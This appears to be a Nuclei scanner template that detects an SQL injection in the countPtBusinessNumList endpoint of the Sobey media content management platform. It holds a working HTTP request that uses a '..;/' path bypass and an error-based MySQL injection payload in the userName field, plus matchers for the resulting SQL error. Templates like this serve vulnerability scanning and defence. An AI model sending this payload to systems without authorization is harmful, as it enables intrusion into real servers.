id: sobey-imcmp-countptbusinessnumlist-sqli
info:
  name: Sobey Integrated Media Content Management Platform countPtBusinessNumList SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    The Sobey Integrated Media Content Management Platform is vulnerable to an SQL injection vulnerability in the countPtBusinessNumList endpoint.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        POST /sobey-mchEditor/js/..;/mch/Jzt/Business/countPtBusinessNumList HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        endTime=1&siteCode=&startTime=10&token=&userCode=&userName='+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1709=1709,md5({{t1}})))),0x7e),1709)+AND+'bckN'='bckN
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "Sobey"
          - ".countPtBusinessNumList"
          - "java.sql.SQLException"
          - "~{{t2}}~"
